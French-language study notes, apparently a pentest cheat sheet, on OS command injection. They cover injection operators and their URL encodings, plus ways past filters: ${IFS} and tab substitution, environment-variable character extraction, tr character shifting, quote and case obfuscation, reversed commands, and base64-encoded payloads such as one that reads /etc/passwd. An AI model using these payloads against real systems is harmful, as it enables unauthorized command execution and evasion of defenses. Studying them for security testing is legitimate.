# Détection
| Injection Operator  | Injection Character | URL-Encoded Character  | Executed Command                            |
| --- | --- | --- | --- |
| Semicolon | ;  | %3b | Both |
| New Line  | \n  | %0a | Both |
| Background  | &  | %26 | Both (second output generally shown first) |
| Pipe | \|  | %7c | Both (only second output is shown) |
| AND  | && | %26%26 | Both (only if first succeeds) |
| OR  | \|\|  | %7c%7c | Second (only if first fails) |
| Sub-Shell | ``  | %60%60 | Both (Linux-only) |
| Sub-Shell  | $() | %24%28%29  | Both (Linux-only) |

Parfois ajouter un \n après notre dernière commande permet de voir le résultat?

# Identifier les protections
WAF: pourrait retourner une erreur différente, moins intégré à l'application.
Charactère ou commande rejeté? Simplement tester les charactères seuls

# Outrepasser les protections
### Espaces rejetés:
* utiliser des tabs (%09)
* env var ${IFS} (contient un espace et un tab par défaut)
* brace expension. Ajoute des espaces entre les arguments {ls,-la}
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

### Utiliser les variables d'environement pour extraire des charactères:
#### Linux:
lister variables:	printenv
* / 	${PATH:0:1}
* ;	${LS_COLORS:10:1}
#### Windows 
##### cmd:
* \\	%HOMEPATH:~6,-11%
##### Powershell:
lister variables:	Get-ChildItem Env:
* \\	$env:HOMEPATH[0]
 
### Shift de charactères:
* ; 	$(tr '!-}' '"-~'<<<:) 	
: est avant ; en ascii. 		tr shift du premier groupe vers le 2eme groupe selon la différence. entre ! et " il y a 1 donc shift de 1.

### Commandes rejetés
##### Linux et Windows:
Utiliser ‘ ‘ ou “ ” pour briser la commande, mais ne pas mélanger. ’w'hoami
##### Linux:
```shell
\ et $@	w\ho\am\i 	who$@ami
# Utiliser des maj et min puis reconvertir en min
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
#Inverser une commande
$(rev<<<'imaohw')
```
##### Windows:
```
^	exister d'autres aussi
WhOaMI	Utiliser casse différente
iex "$('imaohw'[-1..-20] -join '')"	inverser une commande
```

### Encodage
##### Linux:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell 
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

alternatives: sh pour exécution, openssl pour décoder b64 ou xxd pour décodage hex 
##### Windows:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion

# Automatisation
Bashfuscator
DOSfuscation
